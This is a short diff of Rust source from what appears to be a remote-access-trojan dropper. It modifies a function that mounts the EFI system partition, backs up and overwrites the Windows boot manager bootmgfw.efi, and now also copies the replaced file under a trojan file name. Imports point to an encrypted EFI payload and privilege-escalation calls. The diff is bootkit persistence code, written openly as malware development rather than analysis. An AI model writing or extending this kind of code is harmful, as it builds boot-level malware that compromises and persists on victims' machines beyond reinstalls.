@@ -4,6 +4,7 @@ use std::path::PathBuf;
 use std::{fs, io, mem, ptr};
 
 use rat_common::utils::DropGuard;
+use rat_common::windows::RAT_EFI_FILE_NAME;
 use rat_dropper::{
     AdjustTokenPrivileges, EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID,
     GetFirmwareEnvironmentVariableW, LookupPrivilegeValueW, OpenProcessToken, advapi32_dll,
@@ -253,6 +254,7 @@ fn mount_esp_and_setup_persistence() -> bool {
             let bootdir = PathBuf::from("S:\\EFI\\Microsoft\\Boot");
             let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
             let bootmgfw = bootdir.join("bootmgfw.efi");
+            let rat_efi = bootdir.join(RAT_EFI_FILE_NAME);
 
             if !bootmgfw_old.exists()
                 && let Err(e) = fs::copy(&bootmgfw, &bootmgfw_old)
@@ -278,6 +280,11 @@ fn mount_esp_and_setup_persistence() -> bool {
                     eprintln!("Failed to open bootmgfw.efi for writing: {e}");
                     return false;
                 }
+            }
+
+            if let Err(e) = fs::copy(&bootmgfw, &rat_efi) {
+                eprintln!("Failed to copy to {rat_efi:?}: {e}");
+                return false;
             }
 
             drop(guard2);
